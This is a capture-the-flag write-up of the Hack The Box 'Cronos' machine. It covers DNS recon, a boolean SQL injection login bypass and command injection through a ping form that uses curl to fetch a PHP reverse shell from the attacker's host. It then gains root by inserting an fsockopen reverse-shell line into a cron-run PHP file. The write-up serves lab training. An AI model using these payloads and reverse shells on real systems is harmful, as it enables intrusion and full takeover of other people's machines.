# Cronos [HTB](https://app.hackthebox.com/machines/11)
![cronos-01]()


## Recon 

I start by adding the target to my `/etc/hosts` file, followed by an `nmap` scan:

```bash
nmap -sC -sV -A -p- cronos.htb -oN nmap.result
```

![namp-res-02]()

We have the following:

+ An SSH server on port 22.
+ A DNS server on port 53. 
+ A Apache server on port 80.

Let's start with the DNS server to see if we can query some useful information, then we can take a look at the Apache server.

### DNS port 53

Lets try to query for all the entries that the server is willing to disclose:

```bash
dig any cronos.htb @cronos.htb
```

![any-03]()

We got two new domains, `admin.cronos.htb` and `ns1.cronos.htb`. Im gussing the `admin` subdomain is tied to the Apache server. 

I also tried to pull off a zone transfer with:

```bash
dig axfr @cronos.htb
```

This failed, so i added the `admin.cronos.htb` subdomain to `/etc/hosts` and moved on to the Apcache server. 


### Apache Port 80


Lets navigate towards the main site at `http://cronos.htb/` 

![site-04]()

The main page hosts 5 links, all related to the `Laravel` web framework. I found the first link to be the most useful in getting a high-level overview of `Laravel`,  here is the bullet-points of the info.

+ `Laravel` is an open source PHP based framework, while they also recommend to download `Node` and `NPM`. 

+ There is an internal development server running on `http://localhost:8000`:

![development-05]()

Worth to keep that in mind for the future in case we ever need it. 

+ An `.env` config file located at the root of the application should hold sensetive information including encryption keys for cookies and possibly credentials.  

![env-06]()

I've tried to look for this file in the root of the site, wasnt able to find it. But lets keep an eye on that. 

The last link on the main site redirected me to `Laravel`'s Github page where we can find the source code. This is nice, and i read through it a bit, but it seems that the directory structure is different on our target. I tried to use directory treversal tricks to find juicy files but without much success.

So i decided to look online for some hacking tricks on `Laravel`, i found a few interesting articals like [this](https://labs.withsecure.com/publications/laravel-cookie-forgery-decryption-and-rce) one and [this](https://www.ambionics.io/blog/laravel-debug-rce) one, that describe more advanced attacks againts the EAS CBC chiper mode, and some serialized attacks againts PHP. 

Before delving into these sorts of attacks i decided to take a look at the `admin.cronos.htb` subdomain.

## admin.cronos.htb


If we open our browser and navigate towards `http://admin.cronos.htb` we are greeted to a login page:

![login-07]()

At first i tried to brute force this page using `hydra`:

```bash
ydra -l admin -P  /usr/share/wordlists/rockyou.txt admin.cronos.htb http-post-form "/index.php:username=^USER^&password=^PASS^:invalid"
```

While this was going i decided to poke around for SQL injection. At first i tried to generate an error based repsonse, but this didnt work for me. So instead i focused on Boolean payloads when i found that this one works:

```sql
' OR NOT 1120=-1120-- tGvo
```

I input this as the username, and the password i just type `admin`. This gets me past the login page:

![logged-08]()

Looks like this page is running a command? lets look at the source code:

![source-09]()


So we can either run `traceroute` or `ping`, and we can supply to which host. All of this info is getting passed via a POST form, lets intercept that with Burp:

![initial-10]()

Lets try to modify these parameters to run something like `ls .`

![mod-11]()

It works:

![rce-12]()


This `config.php` looks interesting, lets see whats inside:

![empty-13]()

Looks like its empty, but the server renders it anyway, lets try to overwrite this file with a PHP reverse shell and execute it via the URL. I use [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)'s reverse shell. 

After you download the file make sure to update your IP and port info:

![update-14]()

Then rename the file to `config.php`, and start a python web server with:

```bash
python3 -m http.server 80
```

Now we can transfer this over to the target with the following request:

![upload-15]()

```bash
command=curl&host=http://10.10.14.61+-o+config.php
```

Lets start the listener with:

```bash
rlwrap nc -lnvp 443
```

Now when we open `http://admin.cronos.htb/config.php` the browser freezes, and we get a connection as the `www-data` user:

![shell-16]()


## Privilege Escalation

First thing i do when i land on the machine is upgrade to a TTY shell with:

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

After that i started to look around the system, searching for unusual files, or programs, though i couldnt find something really interesting. 

Next i decided to hunt down for SUID binaries with:

```bash
find / -perm -4000 2>/dev/null
```

Again, nothing useful came up here. 

After that i took a look at the running processes with:

```bash
ps auxww
```

Nothing unusual. So i decided to look at `/etc/crontab` and this is where i found something intersting:

![crontab-17]()

 
In essence,  root runs the `/var/www/laravel/aristan` file first and formost, lets take a look at this file:

![aristal-18]()

A simple PHP file, if we add a reverse shell line right at the top, wouldnt that give us a shell as root regarldess of what should have happened next?  

I copy the file over to my kali machine where I can comfortably edit the file with `VI`. Then i add the following two lines at the top:

```php
$sock=fsockopen("10.10.14.61", 443);
exec("/bin/bash -i <&3 >&3 2>&3");
```

![add-19]()

I rename the orginal one on the target and transfer my variant with a python server. 


I then start my listener and get a connection one the cron-job is executed:

![root-20]()
